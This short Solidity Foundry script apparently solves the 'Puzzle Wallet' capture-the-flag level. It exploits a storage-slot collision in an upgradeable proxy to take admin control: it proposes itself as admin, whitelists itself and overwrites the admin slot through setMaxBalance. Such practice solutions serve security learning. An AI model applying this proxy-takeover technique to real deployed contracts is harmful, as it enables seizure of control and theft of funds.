// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {PuzzleWallet} from "../src/PuzzleWallet.sol";
import {PuzzleProxy} from "../src/PuzzleWallet.sol";
import "../src/UpgradeableProxy.sol";

contract PuzzleWalletScript is Script {
    address payable private constant proxy = payable(0xB10be16C53C179897FC57532265c8cC95c6b9D06);

    function run() external {
        vm.startBroadcast();

        PuzzleProxy(proxy).proposeNewAdmin(msg.sender);
        PuzzleWallet(proxy).addToWhitelist(msg.sender);
        PuzzleWallet(proxy).setMaxBalance(uint256(uint160(msg.sender)));

        vm.stopBroadcast();
    }
}
